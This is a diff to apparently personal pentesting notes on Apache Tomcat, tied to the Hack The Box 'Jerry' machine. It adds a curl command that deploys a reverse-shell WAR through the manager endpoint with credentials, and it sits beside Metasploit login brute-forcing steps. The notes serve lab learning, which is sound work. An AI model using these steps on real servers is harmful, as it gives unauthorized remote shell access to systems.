@@ -15,12 +15,14 @@ A java web application can use either or both servlets and JSPs. A combination o
 * **Servlets** ☕: the whole logic is in Java
 * **JSP** 🐲: html-like template files in which we can add Java logic to handle input and create interactive pages.
 
-The admin panel to upload applications if usually at `/manager/html`.
+The admin panel to upload applications if usually at `/manager/html`. To upload an application, you need to package it as a WAR archive. Each app is deployed at a URI, and `index.jsp` is loaded by default <small>(else error)</small>.
 </div></div>
 
 <hr class="sep-both">
 
 ## Pentester Notes ☠️
+
+[![jerry](../../../../../cybersecurity/_badges/htb-p/jerry.svg)](https://app.hackthebox.com/machines/Jerry)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -50,5 +52,23 @@ msf6> set BLANK_PASSWORDS true
 msf6> run
 ```
 
-* You can also try to use metasploit to [upload a reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md#tomcat-reverse-shell).
+* You can also try to use metasploit to [upload a reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md#tomcat-reverse-shell)
+
+* You can use cURL to upload a WAR too:
+
+```ps
+$ curl --upload-file revshell.war -u 'username:password' "URL/manager/text/deploy?path=/shell"
+```
+</div></div>
+
+<hr class="sep-both">
+
+## 👻 To-do 👻
+
+Stuff that I found, but never read/used yet.
+
+<div class="row row-cols-lg-2"><div>
+
+* [apache-tomcat-pentesting](https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/)
+</div><div>
 </div></div>
